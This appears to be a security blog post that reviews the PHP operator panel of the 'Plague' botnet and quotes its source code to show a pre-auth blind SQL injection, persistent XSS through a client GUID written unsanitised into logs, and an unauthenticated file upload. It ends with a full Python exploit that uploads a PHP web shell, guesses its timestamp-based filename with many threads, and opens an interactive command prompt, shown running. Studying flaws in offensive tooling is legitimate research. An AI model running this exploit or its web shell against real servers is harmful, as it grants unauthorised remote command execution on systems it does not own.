## Hacking Botnets 

Why build when you can borrow ;P? On a serious note, I like to have a look at the vulnerabilities of offensive tools. I did look at botnet panels a few years ago and thought that it was time againt to do so.


In this post we'll have a look at the Plague Botnet. You can find it with your favorite search engine or you can take my package where you can easily run it with docker-compose.
While doing static analysis I find it crucial to have a setup where I can test/debug stuff so nowadays I do that first, so take your time to set it up properly if you want to follow along.


The input botnet/RAT/C2 panels need to accept is kind of obvious, "clients" connect to them and data like ip, username, useragent and what not is displayed in the operator panel.
Also they most often allow file uploading. If the files are stored on disk (instead of as blob in a db) this is a good vector for file upload to RCE. And that's what we're going to exploit in the Plague panel.


But before we do, let's start with something else and look at the first code the operator would trigger after browsing to the url.... the login method.

```php
# login : 11

...
//Check if login details were supplied
if(!isset($_POST['user'])){
	header('Location: index.php');
	exit;
} else $_User = htmlspecialchars($_POST['user']);
if(!isset($_POST['pass'])){
	header('Location: index.php');
	exit;
} else $_Pass = strtoupper(hash('sha256', $_POST['pass'] . SALT));

...

if(UserValid($_User, $_Pass)){
  ...


# data.php : 70
function UserValid($_User, $PassHash){
	global $Conn;
	$Sql = "SELECT * FROM users WHERE Username = '$_User'"; // SQL injection here
	$Result = $Conn->query($Sql);
	$Entry = $Result->fetch_assoc();
	return ($Entry['Password']==$PassHash);
}

```


so, does `htmlspecialchars` protect you from SQL injections?! Spoiler: it doesn't. Hence we already have a blind-sqli pre-auth, n1c3. One can now use sqlmap, a custom script and then try to crack the password hash. I don't think you can use it as a login bypass as it compares the hash later on. There might still exist the possibility because "==" is used instead of "===", but at this time I havn't found a reliable way to exploit it.



Ok, vuln number two, oh man this shit is so full of vulns that at some point I just stopped looking. Anyway, persistent XSS is in my opinion another good way to at least make a botnet takeover (creating new admin user, leaking all the data, deleting all the malware on the clients, (push new stuff *evill grin*)) ... there are so many options and I will demonstrate this a bit further when we look at another panel in a later post)

As already mentioned, the operator most often does have a panel to see how many clients are there, what OS do they have what AV and so on and so on. This data is of course taken from the client and if not properly sanitized might lead to all kind of injection scenarios.

The first persistend XSS was in commands.php, the script the client sends it's data back/interacts with the botnet panel.

```php
# commands.php : 4
...
if(!isset($_GET['GUID'])){
	http_response_code(400);
	die('GUID not set.');
} else $GUID = $_GET['GUID'];
...
if(!ClientExists($GUID)){
	RegisterClient($GUID);
	QueueCommand($GUID, 'Register', array(), array());
}

# data.php : 145

function QueueCommand($_GUID, $Command, $Params, $OpName){
  ...
	LogStr($Who . " queued $Command [$NewName] -->\t$_GUID"); 
  ...
}

# log.php : 2
function LogStr($Str){
	$FileName = "logs/Log_" . date("Y-m-d") . ".txt";
	file_put_contents($FileName, "[" . date("Y-m-d H:i:s") . "] " . $Str . "\n", FILE_APPEND | LOCK_EX); // Here the string is written into the log file unsanitized.
}
```

in commands.php QueueCommand() function is called with the fully controllable $GUID. Then the LogStr() function is called which eventually writes the still unsanitized, totally controllable input into the file. ... but they wouldn't also just display the data, would they? *Insert Anakin meme*

so you can just use curl or the below python script to trigger a XSS PoC, writing a good payload is left as an exercise to the reader.


```python
import requests

payload = "<script>alert(1)</script>"

url1 = f"http://localhost:8200/commands.php?GUID=bla{payload}"


r = requests.get(url1)
print(r.text)
```

SCREENSHOT panel



And this isn't the only place where this method will work, also the client data displayed in the panel is just the same, but as they fucked up the database config / insert into process, this does not work on my version per default and I was to lazy to fix it.


Finally we can come to the most revarding vuln, pre-auth file upload to RCE, aah. So the developers do allow the uploading of files and fortunatly for us have no clue about s3kur1ty.

```php
# result.php : 6

if(!isset($_POST['GUID'])){
	http_response_code(400);
	die('GUID not set.');
} else $GUID = $_POST['GUID'];

if(!isset($_POST['RT'])){
	http_response_code(400);
	die('Response type not set.');
} else $RT = $_POST['RT'];

if(!isset($_POST['ID'])){
	http_response_code(400);
	die('Command identifier not set.');
} else $ID = $_POST['ID'];

```

This part of the code just makes sure that all the required parameters are at least set.


```php
# result.php : 1
define("RT_STRING", 1);
define("RT_FILE", 2);
define("RT_REGISTER", 3);
...

# result.php : 29
switch($RT){
  ...
	case RT_FILE:{
		if(!isset($_FILES['File'])){
			http_response_code(400);
			die('File not found.');
	    }
		$Target = 'uploads/' . round((microtime(true) * 1000)+rand(1, 100000)) . '_' . basename($_FILES['File']['name']);
		move_uploaded_file($_FILES['File']['tmp_name'], $Target);
		SetResult($GUID, 'File upload complete.');
	} break;
  ...
}
```


Then we run into a switch statement, as we control RT, we can just hop into RT_FILE, and enjoy the classic file upload vuln. Due to basename we can't do a standard path traversal, but of course they didn't care about .htaccess rules etc. and you also don't need any kind of shared secret/auth to do this. The only thing left is the question, is the filename random enough to not be guessable over the network?

* How many requests can we make per minute?
* What's the max time we will accept as feasible?
* How can we increase the likelyhood?


While the first two factors are debatable, we can of course increase the likelyhood of a hit when uploading more files. Therefore the strategy is simple: 1. Prepare our evil php code, upload ~200 files (you can increase that of course if you want to), and then try to find one of our shells. Easy. Here's the full exploit script, I recommend using it ethically *laught* 


And some example run:
```bash
esjay@g Plague-Release % python3 sploit.py http://localhost:8200
[*] Uploading files ...
[*] Searching for our shell ...
[+] Found shell @ http://localhost:8200/uploads/1629452215549_x.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


```python

import requests
import threading
import time
import sys

def upload(host):

  url = f"{host}/result.php?GUID=bla&RT=bla2&ID=fakeid&Continue=2"

  data = {"Nick" : "nickname", "OS" : "windows", "Comp" : "Compyoyo", "User" :"fakeuser", "CPU" : "CPU123", "GPU" : "GGPU1", "Anti" : "av1", "Def" : "Defender", "Inf" :"infa12", "GUID" : "fakeguid", "RT" : 2, "ID" : "fakeid", "Continue":2}


  files = { "File" : ( "x.php" , b"<?php system($_REQUEST['cmd']); ?>") }

  r = requests.post(url, data=data,files=files, verify=False)


tValue = 0
shellUrl = None
theLock = threading.Lock()


def finder(host):
  global tValue
  global shellUrl
  global theLock

  while shellUrl is None:
    try:
      url = f"{host}/uploads/{tValue}_x.php"
      r = requests.get(url)
      if r.status_code == 200:
        shellUrl = url
    except:
      pass
    finally:
      theLock.acquire()
      tValue += 1
      theLock.release()


def execCmd(url, cmd="id"):
  data = {"cmd" : cmd}
  r = requests.post(url, data=data)
  return r.text


def main():
  if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <host>")
    print(f"Example: {sys.argv[0]} https://evilhost.com")
    sys.exit(1)

  global tValue
  global shellUrl

  print("[*] Uploading files ...")
  # start uploading
  for i in range(100):
    t = threading.Thread(target=upload, args=(sys.argv[1],))
    t.start()

  tValue = int(time.time()*1000)
  finderThreads = []

  # start trying to find one of the shells
  print("[*] Searching for our shell ...")
  for i in range(30):
    t = threading.Thread(target=finder, args=(sys.argv[1],))
    t.start()
    finderThreads.append(t)

  while shellUrl is None:
    time.sleep(1)


  print(f"[+] Found shell @ {shellUrl}\n")
  print(execCmd(shellUrl))

  while 1:
    cmd = input("> ")
    print(execCmd(shellUrl, cmd))


if __name__ == '__main__':
  main()

```



Until next time ;)


